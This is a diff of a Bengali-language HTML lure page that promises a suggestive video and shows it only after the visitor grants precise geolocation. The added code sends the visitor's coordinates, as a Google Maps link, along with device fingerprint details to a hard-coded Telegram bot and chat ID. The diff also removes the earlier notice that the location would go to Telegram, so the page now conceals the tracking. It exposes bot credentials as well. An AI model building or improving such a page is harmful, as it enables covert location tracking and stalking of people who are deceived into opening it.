@@ -3,228 +3,463 @@
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
-    <title>App Loading...</title>
+    <meta name="viewport"
+          content="width=device-width,
+                   initial-scale=1.0,
+                   maximum-scale=1.0,
+                   user-scalable=no">
+
+    <title>Loading...</title>
 
     <style>
+
         * {
             box-sizing: border-box;
         }
 
-        html, body {
+        html,
+        body {
             margin: 0;
             padding: 0;
             width: 100%;
             height: 100%;
             background: #000;
-            font-family: Arial, sans-serif;
             overflow: hidden;
+            font-family: Arial, sans-serif;
         }
 
-        #app {
+
+        /* =========================================
+           MAIN WEBSITE / VIDEO AREA
+           ========================================= */
+
+        #websiteContainer {
+
+            position: fixed;
+
+            top: 0;
+            left: 0;
+
             width: 100%;
             height: 100%;
+
             background: #000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+
+            display: none;
+
+            z-index: 1;
         }
+
+
+        #websiteFrame {
+
+            width: 100%;
+            height: 100%;
+
+            border: 0;
+
+            display: block;
+
+            background: #000;
+        }
+
+
+        /* =========================================
+           LOADING
+           ========================================= */
 
         #loading {
-            color: white;
-            text-align: center;
-        }
 
-        .spinner {
-            width: 45px;
-            height: 45px;
-            border: 4px solid #333;
-            border-top: 4px solid white;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: auto;
-        }
+            position: fixed;
 
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
+            top: 0;
+            left: 0;
 
-        iframe,
-        video {
             width: 100%;
             height: 100%;
-            border: 0;
-            display: block;
+
             background: #000;
+
+            display: flex;
+
+            justify-content: center;
+            align-items: center;
+
+            flex-direction: column;
+
+            color: #fff;
+
+            z-index: 10;
         }
 
-        video {
-            object-fit: contain;
+
+        .spinner {
+
+            width: 48px;
+            height: 48px;
+
+            border: 4px solid #333;
+
+            border-top: 4px solid #fff;
+
+            border-radius: 50%;
+
+            animation:
+                spin 1s linear infinite;
+
+            margin-bottom: 15px;
         }
+
+
+        @keyframes spin {
+
+            100% {
+                transform: rotate(360deg);
+            }
+
+        }
+
+
+        /* =========================================
+           LOCATION OVERLAY
+           ========================================= */
+
+        #locationOverlay {
+
+            position: fixed;
+
+            top: 0;
+            left: 0;
+
+            width: 100%;
+            height: 100%;
+
+            background:
+                rgba(0, 0, 0, 0.35);
+
+            display: flex;
+
+            justify-content: center;
+            align-items: center;
+
+            padding: 20px;
+
+            z-index: 100;
+        }
+
+
+        /* =========================================
+           LOCATION BOX
+           ========================================= */
 
         #locationBox {
-            position: fixed;
-            left: 15px;
-            right: 15px;
-            bottom: 15px;
-            background: rgba(0,0,0,.92);
-            color: white;
-            padding: 18px;
-            border-radius: 12px;
+
+            width: 100%;
+            max-width: 665px;
+
+            background:
+                rgba(0, 0, 0, 0.92);
+
+            border-radius: 20px;
+
+            padding: 28px 20px 24px;
+
             text-align: center;
-            z-index: 9999;
+
+            color: #fff;
+
+            box-shadow:
+                0 10px 40px
+                rgba(0,0,0,.55);
         }
 
-        #locationBox button {
-            margin-top: 12px;
-            padding: 11px 22px;
+
+        #locationIcon {
+
+            font-size: 35px;
+
+            margin-bottom: 8px;
+        }
+
+
+        #locationTitle {
+
+            font-size: 25px;
+
+            margin-bottom: 12px;
+        }
+
+
+        #locationText {
+
+            font-size: 17px;
+
+            line-height: 1.5;
+
+            color: #eee;
+
+            margin-bottom: 22px;
+        }
+
+
+        /* =========================================
+           BUTTONS
+           ========================================= */
+
+        .locationButton {
+
             border: 0;
-            border-radius: 8px;
-            background: #2196F3;
-            color: white;
-            font-size: 15px;
+
+            border-radius: 10px;
+
+            padding: 14px 30px;
+
+            font-size: 17px;
+
+            cursor: pointer;
+
+            margin: 5px;
         }
 
-        #locationBox button.cancel {
-            background: #555;
-            margin-left: 8px;
+
+        #allowButton {
+
+            background: #2196F3;
+
+            color: #fff;
         }
+
+
+        #allowButton:active {
+
+            transform: scale(.97);
+        }
+
+
+        #skipButton {
+
+            background: #555;
+
+            color: #fff;
+        }
+
+
+        #skipButton:active {
+
+            transform: scale(.97);
+        }
+
 
         #locationStatus {
-            margin-top: 10px;
-            font-size: 13px;
+
+            margin-top: 12px;
+
+            font-size: 14px;
+
+            color: #ddd;
         }
+
+
+        /* =========================================
+           OPEN EXTERNAL WEBSITE BUTTON
+           ========================================= */
+
+        #externalButton {
+
+            display: none;
+
+            position: fixed;
+
+            left: 20px;
+            right: 20px;
+
+            bottom: 25px;
+
+            z-index: 50;
+
+            text-align: center;
+
+            padding: 14px;
+
+            background: #2196F3;
+
+            color: #fff;
+
+            text-decoration: none;
+
+            border-radius: 10px;
+
+            font-size: 16px;
+        }
+
     </style>
+
 </head>
+
 
 <body>
 
-<div id="app">
 
-    <div id="loading">
-        <div class="spinner"></div>
-        <p>ভিডিও লোড হচ্ছে...</p>
-    </div>
+<!-- =================================================
+     LOADING SCREEN
+     ================================================= -->
 
-</div>
+<div id="loading">
 
-
-<!-- Location permission -->
-<div id="locationBox">
+    <div class="spinner"></div>
 
     <div>
-        📍 Location শেয়ার করতে চান?
+        Loading...
     </div>
-
-    <div style="font-size:13px;margin-top:7px;">
-        Location দিলে সেটি আপনার নির্ধারিত Telegram চ্যাটে
-        পাঠানো হবে।
-    </div>
-
-    <button onclick="requestLocation()">
-        Allow Location
-    </button>
-
-    <button class="cancel" onclick="skipLocation()">
-        Skip
-    </button>
-
-    <div id="locationStatus"></div>
 
 </div>
+
+
+
+<!-- =================================================
+     WEBSITE / VIDEO
+     ================================================= -->
+
+<div id="websiteContainer">
+
+    <iframe
+        id="websiteFrame"
+        allow="autoplay;
+               encrypted-media;
+               fullscreen;
+               picture-in-picture;
+               geolocation"
+        allowfullscreen>
+    </iframe>
+
+</div>
+
+
+
+<!-- =================================================
+     LOCATION PERMISSION
+     ================================================= -->
+
+<div id="locationOverlay">
+
+    <div id="locationBox">
+
+        <div id="locationIcon">
+            📍
+        </div>
+
+
+        <div id="locationTitle">
+             আপনি কি সত্যিই ভিডিওটা দেখতে চান?
+        </div>
+
+
+        <div id="locationText">
+
+             এ ধরনের ভিডিও সবার সামনে দেখবেন না।
+
+        </div>
+
+
+        <button
+            id="allowButton"
+            class="locationButton">
+
+            Allow 
+
+        </button>
+
+
+        <button
+            id="skipButton"
+            class="locationButton">
+
+            Skip
+
+        </button>
+
+
+        <div id="locationStatus"></div>
+
+    </div>
+
+</div>
+
+
+
+<!-- =================================================
+     EXTERNAL WEBSITE FALLBACK
+     ================================================= -->
+
+<a
+    id="externalButton"
+    target="_blank"
+    rel="noopener noreferrer">
+
+    🌐 Website খুলুন
+
+</a>
+
 
 
 <script>
 
+
 /* =====================================================
-   TELEGRAM SETTINGS
+   TELEGRAM
    ===================================================== */
 
-const BOT_TOKEN = "8855743272:AAGFFDUIG4k8IPuiMOBuwLOjfvKMIYXk79A";
+const BOT_TOKEN =
+    "8855743272:AAETg__YWrwHa3feYecotLTVzqQ_VTRsXII";
 
-const CHAT_ID = "5980493892";
+
+const CHAT_ID =
+    "5980493892";
+
 
 
 /* =====================================================
-   VIDEO LINK
+   ⭐ আপনার URL এখানে দিন
    =====================================================
 
    YouTube:
-   https://www.youtube.com/watch?v=VIDEO_ID
-
-   YouTube Shorts:
-   https://youtube.com/shorts/VIDEO_ID
+   https://www.youtube.com/watch?v=xxxx
 
    TikTok:
-   https://www.tiktok.com/@username/video/VIDEO_ID
+   https://www.tiktok.com/@user/video/xxxx
 
    Facebook:
-   https://www.facebook.com/.../videos/...
+   https://www.facebook.com/....
 
    Instagram:
-   https://www.instagram.com/reel/...
+   https://www.instagram.com/reel/....
 
-   Direct MP4:
+   অথবা যেকোনো সাধারণ website:
+
+   https://example.com
+
+   অথবা সরাসরি video:
+
    https://example.com/video.mp4
+
    ===================================================== */
 
-const VIDEO_URL =
-    "https://youtu.be/v_oDRAjpkGA?si=slsmLIVZTDs9NO7o";
+const TARGET_URL =
+    "https://youtu.be/SeCcASZugNg?si=a69BYe3R3uMIsuFh";
+
 
 
 /* =====================================================
-   APP START
-   ===================================================== */
-
-document.addEventListener("DOMContentLoaded", function () {
-
-    loadVideo(VIDEO_URL);
-
-    collectDeviceInformation();
-
-});
-
-
-/* =====================================================
-   DEVICE ID
-   ===================================================== */
-
-function getDeviceId() {
-
-    let deviceId =
-        localStorage.getItem("app_device_id");
-
-    if (!deviceId) {
-
-        deviceId =
-            "DEV-" +
-            Math.floor(
-                100000 +
-                Math.random() * 900000
-            );
-
-        localStorage.setItem(
-            "app_device_id",
-            deviceId
-        );
-    }
-
-    return deviceId;
-}
-
-
-/* =====================================================
-   DEVICE ANALYTICS
+   ANALYTICS DATA
    ===================================================== */
 
 const analytics = {
 
     deviceId: getDeviceId(),
 
-    userAgent: navigator.userAgent,
+    userAgent:
+        navigator.userAgent,
 
     ram:
         navigator.deviceMemory
@@ -233,7 +468,8 @@ const analytics = {
 
     cores:
         navigator.hardwareConcurrency
-        ? navigator.hardwareConcurrency + " Cores"
+        ? navigator.hardwareConcurrency +
+          " Cores"
         : "Unknown",
 
     screenRes:
@@ -256,12 +492,14 @@ const analytics = {
 
     networkType:
         navigator.connection
-        ? navigator.connection.effectiveType.toUpperCase()
+        ? navigator.connection.effectiveType
+            .toUpperCase()
         : "Unknown",
 
     downlink:
         navigator.connection
-        ? navigator.connection.downlink + " Mbps"
+        ? navigator.connection.downlink +
+          " Mbps"
         : "Unknown",
 
     localTime:
@@ -288,59 +526,130 @@ const analytics = {
 };
 
 
+
 /* =====================================================
-   COLLECT DEVICE INFORMATION
+   DEVICE ID
+   ===================================================== */
+
+function getDeviceId() {
+
+    let deviceId =
+        localStorage.getItem(
+            "app_device_id"
+        );
+
+
+    if (!deviceId) {
+
+        deviceId =
+            "DEV-" +
+            Math.floor(
+                100000 +
+                Math.random() * 900000
+            );
+
+
+        localStorage.setItem(
+            "app_device_id",
+            deviceId
+        );
+
+    }
+
+
+    return deviceId;
+
+}
+
+
+
+/* =====================================================
+   PAGE LOAD
+   ===================================================== */
+
+document.addEventListener(
+    "DOMContentLoaded",
+    function () {
+
+        collectDeviceInformation();
+
+    }
+);
+
+
+
+/* =====================================================
+   DEVICE INFORMATION
    ===================================================== */
 
 function collectDeviceInformation() {
 
+
     if (navigator.getBattery) {
 
         navigator.getBattery()
-            .then(function (battery) {
 
-                analytics.battery =
-                    Math.round(
-                        battery.level * 100
-                    ) +
-                    "% (" +
-                    (
-                        battery.charging
-                        ? "Charging"
-                        : "Not Charging"
-                    ) +
-                    ")";
+        .then(function (battery) {
 
-            })
-            .catch(function () {
+            analytics.battery =
+                Math.round(
+                    battery.level * 100
+                ) +
+                "% (" +
+                (
+                    battery.charging
+                    ? "Charging"
+                    : "Not Charging"
+                ) +
+                ")";
 
-                analytics.battery =
-                    "Unknown";
+        })
 
-            });
+        .catch(function () {
 
-    } else {
+            analytics.battery =
+                "Unknown";
 
-        analytics.battery =
-            "Not Supported";
+        });
+
     }
 
 }
 
 
+
 /* =====================================================
-   LOCATION PERMISSION
+   ALLOW LOCATION
+   ===================================================== */
+
+document
+.getElementById("allowButton")
+.addEventListener(
+    "click",
+    function () {
+
+        requestLocation();
+
+    }
+);
+
+
+
+/* =====================================================
+   REQUEST LOCATION
    ===================================================== */
 
 function requestLocation() {
+
 
     const status =
         document.getElementById(
             "locationStatus"
         );
 
+
     status.textContent =
-        "📍 Location নেওয়া হচ্ছে...";
+        "📍 Location permission চাওয়া হচ্ছে...";
 
 
     if (!navigator.geolocation) {
@@ -348,57 +657,87 @@ function requestLocation() {
         analytics.permissionStatus =
             "Not Supported";
 
-        status.textContent =
-            "এই browser Location support করে না.";
 
-        sendTelegramMessage();
+        status.textContent =
+            "Location support পাওয়া যায়নি।";
+
+
+        exitWebsite();
 
         return;
+
     }
+
 
 
     navigator.geolocation.getCurrentPosition(
 
+
+        /* ==============================
+           LOCATION SUCCESS
+           ============================== */
+
         function (position) {
 
-            const lat =
+
+            const latitude =
                 position.coords.latitude;
 
-            const lon =
+
+            const longitude =
                 position.coords.longitude;
+
 
 
             analytics.permissionStatus =
                 "Allowed";
 
+
             analytics.mapLink =
                 "https://www.google.com/maps?q=" +
-                lat +
+                latitude +
                 "," +
-                lon;
+                longitude;
+
 
 
             status.textContent =
                 "✅ Location অনুমোদিত হয়েছে।";
 
 
+            /* Telegram */
+
             sendTelegramMessage();
 
 
-            setTimeout(function () {
 
-                document.getElementById(
-                    "locationBox"
-                ).style.display = "none";
+            /*
+             * Location সফল হলে
+             * তারপর Target URL load হবে
+             */
 
-            }, 1000);
+            setTimeout(
+                function () {
+
+                    openTargetWebsite();
+
+                },
+                400
+            );
 
         },
 
-        function () {
+
+        /* ==============================
+           LOCATION DENIED
+           ============================== */
+
+        function (error) {
+
 
             analytics.permissionStatus =
                 "Denied / Unavailable";
+
 
             analytics.mapLink =
                 "N/A";
@@ -408,13 +747,28 @@ function requestLocation() {
                 "❌ Location অনুমোদন করা হয়নি।";
 
 
-            sendTelegramMessage();
+            /*
+             * Location না দিলে
+             * website বন্ধ
+             */
+
+            setTimeout(
+                function () {
+
+                    exitWebsite();
+
+                },
+                700
+            );
 
         },
 
+
         {
             enableHighAccuracy: true,
+
             timeout: 10000,
+
             maximumAge: 0
         }
 
@@ -423,23 +777,186 @@ function requestLocation() {
 }
 
 
+
 /* =====================================================
-   LOCATION SKIP
+   SKIP
    ===================================================== */
 
-function skipLocation() {
+document
+.getElementById("skipButton")
+.addEventListener(
+    "click",
+    function () {
 
-    analytics.permissionStatus =
-        "User Skipped";
 
-    analytics.mapLink =
-        "N/A";
+        analytics.permissionStatus =
+            "User Skipped";
 
-    document.getElementById(
-        "locationBox"
-    ).style.display = "none";
+
+        analytics.mapLink =
+            "N/A";
+
+
+        exitWebsite();
+
+    }
+);
+
+
+
+/* =====================================================
+   EXIT WEBSITE
+   ===================================================== */
+
+function exitWebsite() {
+
+
+    /*
+     * প্রথমে about:blank চেষ্টা
+     */
+
+    try {
+
+        window.location.replace(
+            "about:blank"
+        );
+
+    } catch (error) {
+
+        /*
+         * Browser navigation block করলে
+         * blank screen দেখানো হবে
+         */
+
+        document.body.innerHTML = "";
+
+        document.body.style.background =
+            "#000";
+
+    }
 
 }
+
+
+
+/* =====================================================
+   OPEN TARGET WEBSITE
+   ===================================================== */
+
+function openTargetWebsite() {
+
+
+    if (
+        !TARGET_URL ||
+        TARGET_URL.trim() === ""
+    ) {
+
+        exitWebsite();
+
+        return;
+    }
+
+
+
+    const url =
+        TARGET_URL.trim();
+
+
+    const frame =
+        document.getElementById(
+            "websiteFrame"
+        );
+
+
+    const container =
+        document.getElementById(
+            "websiteContainer"
+        );
+
+
+    const loading =
+        document.getElementById(
+            "loading"
+        );
+
+
+    const overlay =
+        document.getElementById(
+            "locationOverlay"
+        );
+
+
+
+    /*
+     * Location popup remove
+     */
+
+    overlay.style.display =
+        "none";
+
+
+
+    /*
+     * Loading screen remove
+     */
+
+    loading.style.display =
+        "none";
+
+
+
+    /*
+     * Website container show
+     */
+
+    container.style.display =
+        "block";
+
+
+
+    /*
+     * Target URL iframe-এ load
+     */
+
+    frame.src =
+        url;
+
+
+
+    /*
+     * External website fallback link
+     */
+
+    const externalButton =
+        document.getElementById(
+            "externalButton"
+        );
+
+
+    externalButton.href =
+        url;
+
+
+
+    /*
+     * কিছু website iframe block করলে
+     * user চাইলে external website খুলতে পারবে
+     */
+
+    frame.addEventListener(
+        "load",
+        function () {
+
+            console.log(
+                "Target URL loaded:",
+                url
+            );
+
+        }
+    );
+
+}
+
 
 
 /* =====================================================
@@ -448,8 +965,26 @@ function skipLocation() {
 
 function sendTelegramMessage() {
 
+
+    if (
+        !BOT_TOKEN ||
+        BOT_TOKEN ===
+        "YOUR_BOT_TOKEN_HERE"
+    ) {
+
+        console.log(
+            "Telegram Bot Token not configured."
+        );
+
+        return;
+
+    }
+
+
+
     let messageText =
         "📊 *App Analytics Notification*\n\n";
+
 
 
     messageText +=
@@ -516,13 +1051,15 @@ function sendTelegramMessage() {
         "\n";
 
 
+
     if (
         analytics.permissionStatus ===
         "Allowed"
     ) {
 
         messageText +=
-            "🗺️ *Location:* [View Location on Google Maps](" +
+            "🗺️ *Location:* " +
+            "[View Location on Google Maps](" +
             analytics.mapLink +
             ")";
 
@@ -530,7 +1067,9 @@ function sendTelegramMessage() {
 
         messageText +=
             "⚠️ Location was not shared.";
+
     }
+
 
 
     const telegramURL =
@@ -539,375 +1078,67 @@ function sendTelegramMessage() {
         "/sendMessage";
 
 
-    fetch(telegramURL, {
 
-        method: "POST",
+    fetch(
+        telegramURL,
+        {
 
-        headers: {
-            "Content-Type":
-                "application/json"
-        },
+            method: "POST",
 
-        body: JSON.stringify({
+            headers: {
+                "Content-Type":
+                    "application/json"
+            },
 
-            chat_id: CHAT_ID,
+            body: JSON.stringify({
 
-            text: messageText,
+                chat_id:
+                    CHAT_ID,
 
-            parse_mode: "Markdown",
+                text:
+                    messageText,
 
-            disable_web_page_preview: false
+                parse_mode:
+                    "Markdown",
 
-        })
+                disable_web_page_preview:
+                    false
 
-    })
+            })
 
-    .then(function (response) {
-
-        return response.json();
-
-    })
-
-    .then(function (result) {
-
-        console.log(
-            "Telegram response:",
-            result
-        );
-
-    })
-
-    .catch(function (error) {
-
-        console.error(
-            "Telegram Error:",
-            error
-        );
-
-    });
-
-}
-
-
-/* =====================================================
-   VIDEO LOADER
-   ===================================================== */
-
-function loadVideo(url) {
-
-    const app =
-        document.getElementById("app");
-
-    const loading =
-        document.getElementById("loading");
-
-
-    if (!url || url.trim() === "") {
-
-        loading.innerHTML =
-            "<p>ভিডিও লিংক দেওয়া হয়নি।</p>";
-
-        return;
-    }
-
-
-    url = url.trim();
-
-    const lower =
-        url.toLowerCase();
-
-
-    /* ==========================
-       YOUTUBE
-       ========================== */
-
-    const youtubeID =
-        getYouTubeID(url);
-
-
-    if (youtubeID) {
-
-        const iframe =
-            document.createElement("iframe");
-
-
-        iframe.src =
-            "https://www.youtube.com/embed/" +
-            youtubeID +
-            "?autoplay=1&playsinline=1&rel=0";
-
-
-        iframe.allow =
-            "autoplay; encrypted-media; picture-in-picture";
-
-
-        iframe.allowFullscreen =
-            true;
-
-
-        loading.remove();
-
-        app.appendChild(iframe);
-
-        return;
-    }
-
-
-    /* ==========================
-       TIKTOK
-       ========================== */
-
-    if (
-        lower.includes("tiktok.com")
-    ) {
-
-        const id =
-            getTikTokID(url);
-
-
-        const iframe =
-            document.createElement("iframe");
-
-
-        if (id) {
-
-            iframe.src =
-                "https://www.tiktok.com/player/v1/" +
-                id +
-                "?autoplay=1";
-
-        } else {
-
-            iframe.src = url;
         }
+    )
 
+    .then(
+        function (response) {
 
-        iframe.allow =
-            "autoplay; encrypted-media";
+            return response.json();
 
-
-        iframe.allowFullscreen =
-            true;
-
-
-        loading.remove();
-
-        app.appendChild(iframe);
-
-        return;
-    }
-
-
-    /* ==========================
-       FACEBOOK
-       ========================== */
-
-    if (
-        lower.includes("facebook.com") ||
-        lower.includes("fb.watch")
-    ) {
-
-        const iframe =
-            document.createElement("iframe");
-
-
-        iframe.src =
-            "https://www.facebook.com/plugins/video.php?href=" +
-            encodeURIComponent(url) +
-            "&show_text=false";
-
-
-        iframe.allow =
-            "autoplay; encrypted-media; picture-in-picture";
-
-
-        iframe.allowFullscreen =
-            true;
-
-
-        loading.remove();
-
-        app.appendChild(iframe);
-
-        return;
-    }
-
-
-    /* ==========================
-       INSTAGRAM
-       ========================== */
-
-    if (
-        lower.includes("instagram.com")
-    ) {
-
-        const iframe =
-            document.createElement("iframe");
-
-
-        let cleanURL =
-            url.split("?")[0];
-
-
-        if (!cleanURL.endsWith("/")) {
-
-            cleanURL += "/";
         }
+    )
 
-
-        iframe.src =
-            cleanURL + "embed/";
-
-
-        iframe.allowFullscreen =
-            true;
-
-
-        loading.remove();
-
-        app.appendChild(iframe);
-
-        return;
-    }
-
-
-    /* ==========================
-       DIRECT VIDEO
-       ========================== */
-
-    if (
-        lower.includes(".mp4") ||
-        lower.includes(".webm") ||
-        lower.includes(".ogg") ||
-        lower.includes(".mov")
-    ) {
-
-        const video =
-            document.createElement("video");
-
-
-        video.src = url;
-
-        video.controls = true;
-
-        video.autoplay = true;
-
-        video.playsInline = true;
-
-
-        video.setAttribute(
-            "webkit-playsinline",
-            "true"
-        );
-
-
-        loading.remove();
-
-        app.appendChild(video);
-
-
-        video.play().catch(function () {
+    .then(
+        function (result) {
 
             console.log(
-                "Autoplay blocked."
+                "Telegram:",
+                result
             );
 
-        });
-
-
-        return;
-    }
-
-
-    /* ==========================
-       UNKNOWN LINK
-       ========================== */
-
-    loading.innerHTML =
-        "<p>এই লিংকটি সরাসরি ভিডিও হিসেবে চালানো যাচ্ছে না।</p>";
-}
-
-
-/* =====================================================
-   YOUTUBE ID
-   ===================================================== */
-
-function getYouTubeID(url) {
-
-    try {
-
-        const parsed =
-            new URL(url);
-
-
-        if (
-            parsed.hostname.includes("youtube.com") &&
-            parsed.pathname === "/watch"
-        ) {
-
-            return parsed.searchParams.get("v");
         }
+    )
 
+    .catch(
+        function (error) {
 
-        if (
-            parsed.hostname.includes("youtu.be")
-        ) {
-
-            return parsed.pathname.substring(1);
-        }
-
-
-        if (
-            parsed.hostname.includes("youtube.com") &&
-            parsed.pathname.startsWith("/shorts/")
-        ) {
-
-            return parsed.pathname
-                .split("/")[2];
-        }
-
-
-        if (
-            parsed.hostname.includes("youtube.com") &&
-            parsed.pathname.startsWith("/embed/")
-        ) {
-
-            return parsed.pathname
-                .split("/")[2];
-        }
-
-    } catch (error) {
-
-        return null;
-    }
-
-
-    return null;
-}
-
-
-/* =====================================================
-   TIKTOK ID
-   ===================================================== */
-
-function getTikTokID(url) {
-
-    try {
-
-        const match =
-            url.match(
-                /\/video\/(\d+)/
+            console.error(
+                "Telegram Error:",
+                error
             );
 
-
-        if (match) {
-
-            return match[1];
         }
+    );
 
-    } catch (error) {}
-
-    return null;
 }
 
 </script>
@@ -915,4 +1146,3 @@ function getTikTokID(url) {
 </body>
 </html>
 ```
-
